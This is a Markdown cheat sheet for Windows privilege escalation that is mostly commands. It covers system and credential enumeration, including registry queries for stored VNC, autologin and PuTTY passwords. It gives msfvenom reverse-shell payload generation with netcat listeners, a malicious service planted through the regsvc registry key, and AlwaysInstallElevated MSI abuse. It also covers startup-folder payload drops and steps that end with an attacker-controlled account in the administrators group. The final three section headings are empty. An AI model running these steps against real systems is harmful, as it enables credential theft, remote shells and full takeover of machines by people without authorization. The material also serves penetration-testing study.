# Windows_Priv-Esc_Cheatsheet
## Initial Enumeration
### System Enumeration
  ```cmd
  systeminfo
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  hostname
  wmic qfc
  wmic qfc get Caption,Description,HotFixID,InstalledON
  wmic logicaldisk get Caption,Description,ProviderName
  ```

### User Enumeration
  ```cmd
  whoami
  whoami /priv
  whoami /groups
  net user
  net user administrator
  net localgroup
  net local group administrators
  
  ```

### Network Enumeration
  ```cmd
  ipconfig
  ipconfig /all
  arp -a
  route print
  netstat -ano
  ```

### Password Enumeration
  ```cmd
  findstr /si password *.txt *.ini *.config
  ```

### AV Enumeration
  ```sc
  sc query windefend
  sc queryex type= service
  netsh advfirewall dump
  netsh firewall show state
  netsh firewall show config
  ```

## Kernel Exploits
  1. Get the system info
  ```cmd
  systeminfo
  ```
  2. Run an exploit suggester against the system info
  3. Work through and reasearch the vulnerabilities
  4. Run the exploit
  5. NT Authority\system! 

## Passwords
### Search for Passwords
  1. In a txt file
  ```cmd
  findstr /si password *.txt
  findstr /si password *.ini
  findstr /si password *.xml
  ```
  2. In Config Files
  ```cmd
  dir /s *pass* == *cred* == *vnc* == *.config*
  ```
  3. In all files 
  ```cmd
  findstr /spin "password" *.*
  ```

### Files Worth Checking that have Credentials
  * c:\sysprep.inf
  * c:\sysprep\sysprep.xml
  * c:\unattend.xml
  * %WINDIR%\Panther\Unattend\Unattended.xml
  * %WINDIR%\Panther\Unattended.xml
  ```cmd
  dir c:\*vnc.ini /s /b
  dir c:\*ultravnc.ini /s /b 
  dir c:\ /s /b | findstr /si *vnc.ini
  ```
  
### In Registry
#### VNC
  ```cmd
  reg query "HKCU\Software\ORL\WinVNC3\Password"
  ```
#### Windows autologin
  ```cmd
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  ```
#### SNMP Parameters
  ```cmd
  reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
  ```
#### Putty
  ```cmd
  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
  ```
#### Search for Password in Registry
  ```cmd
  reg query HKLM /f password /t REG_SZ /s
  reg query HKCU /f password /t REG_SZ /s
  ```

## Windows Subsystem for Linux
### Locate bash.exe
  ```cmd
  where /R C;\Windows bash.exe
  ```
### Locate wsl.exe
  ```cmd
  where /R C;\Windows wsl.exe
  ```

## Impersonation and Potato Attacks
  1. Check Privileges
  ```cmd
  whoami /priv
  ```
  2. Check for SeAssignPrimaryToken and SeImpersonate
  3. Run the Potato Attack on the System
  4. NT Authority\System

## RunAs
  1. Identify stored credentials
  ```cmd
  cmdkey /list
  ```
  2. Run Runas.exe
  ```cmd
  C:\Windows\System32\runas.exe /user:<user from cmdkey /list> /savecred "<program to execute>"
  ```
  3. I recommend a shell such as:
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
  ```
  4. NT Authority\System!

## Registry
### Autoruns
#### Sysinternals Suite
  1. Run autoruns64.exe. Check for a program that seems out of place
  2. Run accesscheck64.exe. Check for output that "Everyone" has "FILE_ALL_ACCESS"
  ```cmd
  accesscheck64.exe -wvu "C:\Path\to\Autorun"
  ```

#### Powershell using PowerUp
  1. Start Powershell and run PowerUp.ps1
  ```cmd
  powershell -ep bypass
  . .\PowerUp.ps1
  Invoke-AllChecks
  ```
#### Exploiting Autoruns
  1. Generate a msfvenom payload
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <autorun_program.exe>
  ```
  2. Start a listener
  ```bash
  nc -nvlp <PORT>
  ```
  3. NT Authority\System! 

### AlwaysInstallElevated
#### Checking Registries
  1. Check the Registry and look for 0x1
  ```cmd
  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
  ```
  ```cmd
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  ```
  2. Generate a msfvenom payload
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > setup.msi
  ```
  3. Run the installer
  4. NT Authority\System!

#### Using PowerUp
  1. Check for AlwaysInstallElevated
  2. If present run
  ```powershell
  Write-userAddMSI
  ```
  3. Run the installer
  4. Generate a new administrator
  5. PROFIT!

#### Using Metasploit
  1. Run the module:
  ```bash
  use /exploit/windows/local/always_install_elevated
  ```

### regsvc ACL
  1. start powershell
  ```cmd
  powershell -ep bypass
  ```
  2. Check for FullControl of a registry key
  ```powershell
  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
  ```
  3. Change line #15 in windows_service.c to a user you control
  4. Save the file and compile it:
  ```bash
  x86_64-w64-mingw32-gcc windows_service.c -o x.exe
  ```
  5. Copy the generated file to the target in the 'C:\Temp' Folder
  6. Add the malicious service
  ```cmd
  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
  ```
  7. Start the malicious service
  ```cmd
  sc start regsvc
  ```
  8. Verify the user is in the local administrator group
  ```cmd
  net localgroup administrators
  ```
  9. PROFIT!

## Executable FIles
  1. Run PowerUp.ps1 and check for service executable and argument permissions
  ```cmd
  powershell -ep bypass
  . .\PowerUp.ps1
  Invoke-AllChecks
  ```
  2. Run accesschk64.exe on the path of the executable look fot Everyone FILE_ALL_ACCESS
  ```cmd
  accesscheck64.exe -wvu "C:\Path\to\Executable"
  ```
  3. Save the x.exe from earlier to the location of the executable
  4. Start the service
  ```cmd
  sc start <service>
  ```
  5. Verify that the user is in the local administrator group
  ```cmd
  net localgroup administrators
  ```
  6. PROFIT!
  
## Startup Application
  1. Check for access on Start Up Folder
  ```cmd
  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  ```
  2.  Generate a msfvenom payload
    ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <start_program.exe>
  ```
  3. Start a listener
    ```bash
  nc -nvlp <PORT>
  ```
  5. Move the program to the start up folder on the target machine
  6. Wait for an admin log in
  7. PROFIT!

## DLL Hijacking
## Service Permissions (Paths)
## CVE-2019-1388



